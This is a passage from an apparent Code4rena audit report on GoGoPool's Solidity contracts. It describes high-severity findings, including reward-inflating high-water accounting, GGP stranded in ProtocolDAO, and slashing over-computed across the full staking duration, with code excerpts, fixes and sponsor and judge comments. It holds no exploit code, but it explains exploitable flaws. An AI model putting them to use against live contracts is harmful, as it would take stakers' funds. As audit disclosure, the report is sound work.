fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Call <code>staking.resetAVAXAssignedHighWater(owner)</code> instead of calling <code>increaseAVAXAssignedHighWater()</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">MinipoolManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">373</span><span class=\"mtk1\">: \t\t</span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAVAXAssignedHighWater</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">) &lt; </span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAVAXAssigned</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">374</span><span class=\"mtk1\">: \t\t\t</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">resetAVAXAssignedHighWater</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//@audit update to the current AVAX assigned</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">375</span><span class=\"mtk1\">: \t\t}</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/566\">emersoncloud (GoGoPool) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/566#issuecomment-1407447319\">Franfran (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Can we take some extra considerations here please?<br>\nDiscussed with @0xju1ie (GoGoPool) about this specific issue, and this was the answer:</p>\n<p>(<em>it</em> is AVAXAssignedHighWater)</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">It increases on a per minipool basis right now, increasing based on only what that single minipool is getting. </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">If it was to just update the AVAXAssignedHighWater to getAVAXAssigned, then it could be assigning the highwater mark too early.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">EX for how it is now:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">1. create minipool1, assignedAvax = 1k, high water= 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2. create minipool2, assignedAvax =1k, high water = 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">3. record start for minipool1, highwater -&gt; 1k</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">4.  record start for minipool2, highwater -&gt; 2k</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">EX for how your suggestion could be exploited:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">1. create minipool1, assignedAvax = 1k, high water= 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2. create minipool2, assignedAvax =1k, high water = 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">3. record start for minipool1, highwater -&gt; 2k</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">4.  cancel minipool2, highwater -&gt; 2k</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">if we used only avax assigned for that case then it would mess up the collateralization ratio for the second minipool and they would only get paid for the minipool that they are currently operating, not the one that ended previously. </span></span></code></pre>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/566#issuecomment-1411791734\">0xju1ie (GoGoPool) commented</a>:</strong></p>\n<blockquote>\n<p>Their example in the proof of concept section is correct, and we have decided that this is not the ideal behavior and thus this is a bug. However, their recommended mitigation steps would create other issues, as highlighted by what @Franfran said. We intend to solve this issue differently than what they suggested.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/566#issuecomment-1414347752\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown a flaw in the way <code>increaseAVAXAssignedHighWater</code> is used, which can be used to:</p>\n<ul>\n<li>Inflate the amount of AVAX</li>\n<li>With the goal of extracting more rewards than intended</li>\n</ul>\n<p>I believe that the finding highlights both a way to extract further rewards as well as broken accounting.</p>\n<p>For this reason I agree with High Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed\">emersoncloud (GoGoPool) mitigated</a>:</strong></p>\n<blockquote>\n<p>New variable to track validating avax: <a href=\"https://github.com/multisig-labs/gogopool/pull/25\">multisig-labs/gogopool#25</a></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed with comments. Full details in <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/2\">report from RaymondFam</a>.</p>\n<hr>\n<h2 id=\"h-02-protocoldao-lacks-a-method-to-take-out-ggp\" style=\"position:relative;\"><a href=\"#h-02-protocoldao-lacks-a-method-to-take-out-ggp\" aria-label=\"h 02 protocoldao lacks a method to take out ggp permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/532\">[H-02] ProtocolDAO lacks a method to take out GGP</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/532\">bin2chen</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/845\">AkshaySrivastav</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/571\">hansfriese</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/567\">hansfriese</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/544\">caventa</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/507\">shark</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/354\">RaymondFam</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/306\">csanuragjain</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/238\">rvierdiiev</a>, and <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/178\">cozzetti</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/Staking.sol#L379-L383\">contracts/contract/Staking.sol#L379-L383</a></p>\n<p>ProtocolDAO implementation does not have a method to take out  GGP. So it can’t handle ggp unless it updates ProtocolDAO.</p>\n<h3 id=\"proof-of-concept-1\" style=\"position:relative;\"><a href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>recordStakingEnd() will pass the rewards of this reward.<br>\n“If the validator is failing at their duties, their GGP will be slashed and used to compensate the loss to our Liquid Stakers”</p>\n<p>At this point slashGGP() will be executed and the GGP will be transferred to “ProtocolDAO”</p>\n<p>staking.slashGGP():</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"3\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">slashGGP</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stakerAddr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ggpAmt</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlySpecificRegisteredContract</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MinipoolManager&quot;</span><span class=\"mtk1\">, msg.sender) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">Vault</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vault</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">Vault</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getContractAddress</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Vault&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">decreaseGGPStake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stakerAddr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ggpAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transferToken</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ProtocolDAO&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ggp</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ggpAmt</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>But the current ProtocolDAO implementation does not have a method to take out  GGP. So it can’t handle ggp unless it updates ProtocolDAO</p>\n<h3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>1.transfer GGP to  ClaimProtocolDAO<br>\nor<br>\n2.Similar to ClaimProtocolDAO, add spend method to retrieve GGP</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ProtocolDAO</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Base</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">spend</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">recipientAddress</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyGuardian</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">Vault</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vault</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">Vault</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getContractAddress</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Vault&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">TokenGGP</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ggpToken</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">TokenGGP</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getContractAddress</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;TokenGGP&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOfToken</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ProtocolDAO&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ggpToken</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidAmount</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">withdrawToken</span><span class=\"mtk1\">(</span><span class=\"mtk12\">recipientAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ggpToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">GGPTokensSentByDAOProtocol</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">recipientAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+   }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/532#issuecomment-1414367063\">Alex the Entreprenerd (judge) increased severity to High and commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how, due to a lack of <code>sweep</code> the default contract for fee handling will be unable to retrieve tokens sent to it.</p>\n<p>While the issue definitely would have been discovered fairly early in Prod, the in-scope system makes it clear that the funds would have been sent to ProtocolDAO.sol and would have been lost indefinitely.</p>\n<p>For this reason, I believe the finding to be of High Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/532#issuecomment-1421419694\">emersoncloud (GoGoPool) commented</a>:</strong></p>\n<blockquote>\n<p>Acknowledged.</p>\n<p>Thanks for the report. This is something we’re aware of and are not going to fix at the moment.</p>\n<p>The funds are transferred to the Vault and the ProtocolDAO contract is upgradeable. Therefore in the future we can upgrade the contract to spend the Vault GGP tokens to return funds to Liquid Stakers.</p>\n<p>We expect slashing to be a rare event and might have some manual steps involved in the early days of the protocol to do this process if it occurs.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-03-node-operator-is-getting-slashed-for-full-duration-even-though-rewards-are-distributed-based-on-a-14-day-cycle\" style=\"position:relative;\"><a href=\"#h-03-node-operator-is-getting-slashed-for-full-duration-even-though-rewards-are-distributed-based-on-a-14-day-cycle\" aria-label=\"h 03 node operator is getting slashed for full duration even though rewards are distributed based on a 14 day cycle permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/493\">[H-03] Node operator is getting slashed for full duration even though rewards are distributed based on a 14 day cycle</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/493\">immeas</a>, also found by <a href=\"undefined\">Allarious</a>, <a href=\"undefined\">ast3ros</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/881\">unforgiven</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/794\">Josiah</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/592\">SmartSek</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/490\">Franfran</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/344\">HollaDieWaldfee</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/322\">RaymondFam</a>, and <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/216\">0xdeadbeef0x</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/MinipoolManager.sol#L673-L675\">contracts/contract/MinipoolManager.sol#L673-L675</a></p>\n<p>A node operator sends in the amount of duration they want to stake for. Behind the scenes Rialto will stake in 14 day cycles and then distribute rewards.</p>\n<p>If a node operator doesn’t have high enough availability and doesn’t get any rewards, the protocol will slash their staked <code>GGP</code>. For calculating the expected rewards that are missed however, the full duration is used:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">MinipoolManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">557</span><span class=\"mtk1\">:\t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getExpectedAVAXRewardsAmt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">duration</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">avaxAmt</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">558</span><span class=\"mtk1\">:\t\t</span><span class=\"mtk12\">ProtocolDAO</span><span class=\"mtk1\"> </span><span class=\"mtk12\">dao</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ProtocolDAO</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getContractAddress</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ProtocolDAO&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">559</span><span class=\"mtk1\">:\t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rate</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">dao</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getExpectedAVAXRewardsRate</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">560</span><span class=\"mtk1\">:\t\t</span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">avaxAmt</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mulWadDown</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rate</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">duration</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">365</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// full duration used when calculating expected reward</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">561</span><span class=\"mtk1\">:\t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">670</span><span class=\"mtk1\">:\t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">slash</span><span class=\"mtk1\">(</span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">index</span><span class=\"mtk1\">) </span><span class=\"mtk11\">private</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">673</span><span class=\"mtk1\">:\t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">duration</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;minipool.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">index</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.duration&quot;</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">674</span><span class=\"mtk1\">:\t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">avaxLiquidStakerAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;minipool.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">index</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.avaxLiquidStakerAmt&quot;</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">675</span><span class=\"mtk1\">:\t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">expectedAVAXRewardsAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getExpectedAVAXRewardsAmt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">duration</span><span class=\"mtk1\">, </span><span class=\"mtk12\">avaxLiquidStakerAmt</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// full duration</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">676</span><span class=\"mtk1\">:\t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">slashGGPAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">calculateGGPSlashAmt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">expectedAVAXRewardsAmt</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>This is unfair to the node operator because the expected rewards is from a 14 day cycle.</p>\n<p>Also, If they were to be unavailable again, in a later cycle, they would get slashed for the full duration once again.</p>\n<h3 id=\"impact\" style=\"position:relative;\"><a href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>A node operator staking for a long time is getting slashed for an unfairly large amount if they aren’t available during a 14 day period.</p>\n<p>The protocol also wants node operators to stake in longer periods: <a href=\"https://multisiglabs.notion.site/Known-Issues-42e2f733daf24893a93ad31100f4cd98\">https://multisiglabs.notion.site/Known-Issues-42e2f733daf24893a93ad31100f4cd98</a></p>\n<blockquote>\n<p>Team Comment:<br></p>\n<ul>\n<li>This can only be taken advantage of when signing up for 2-4 week validation periods. <strong>Our protocol is incentivizing nodes to sign up for 3-12 month validation periods.</strong> If the team notices this mechanic being abused, Rialto may update its GGP reward calculation to disincentive this behavior.</li>\n</ul>\n</blockquote>\n<p>This slashing amount calculation incentives the node operator to sign up for the shortest period possible and restake themselves to minimize possible losses.</p>\n<h3 id=\"proof-of-concept-2\" style=\"position:relative;\"><a href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 